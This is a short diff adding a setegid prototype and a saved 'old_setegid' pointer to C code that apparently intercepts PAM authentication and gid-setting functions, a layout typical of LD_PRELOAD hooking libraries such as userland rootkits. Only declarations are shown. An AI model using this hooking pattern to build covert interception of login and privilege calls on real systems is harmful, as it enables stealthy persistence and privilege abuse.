@@ -142,6 +142,7 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags);
 
 // symbols/gid/*
 int setgid(gid_t gid);
+int setegid(gid_t egid);
 int setregid(gid_t rgid, gid_t egid);
 int setresgid(gid_t rgid, gid_t egid, gid_t sgid);
 
@@ -281,6 +282,7 @@ typeof(pam_open_session) *old_pam_open_session;
 typeof(pam_acct_mgmt) *old_pam_acct_mgmt;
 
 typeof(setgid) *old_setgid;
+typeof(setegid) *old_setegid;
 typeof(setregid) *old_setregid;
 typeof(setresgid) *old_setresgid;
 
